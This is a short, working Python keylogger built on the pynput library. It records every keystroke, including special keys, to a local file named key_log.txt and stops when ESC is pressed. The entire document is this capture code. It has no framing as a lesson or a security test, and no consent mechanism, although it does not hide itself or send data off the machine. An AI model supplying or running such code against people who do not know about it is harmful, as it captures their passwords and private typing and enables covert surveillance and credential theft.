from pynput import keyboard

# Define the file where the keystrokes will be saved
log_file = "key_log.txt"

# Function to write the keystrokes to a file
def write_to_file(key):
    with open(log_file, "a") as file:
        try:
            # Handle regular character keys
            file.write(key.char)
        except AttributeError:
            # Handle special keys (like Enter, Space, Backspace)
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.backspace:
                file.write("[BACKSPACE]")
            elif key == keyboard.Key.tab:
                file.write("\t")
            else:
                file.write(f"[{key.name}]")

# Callback function when a key is pressed
def on_press(key):
    write_to_file(key)

# Callback function when a key is released (optional, not used in this case)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener when ESC is pressed
        return False

# Set up the key listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
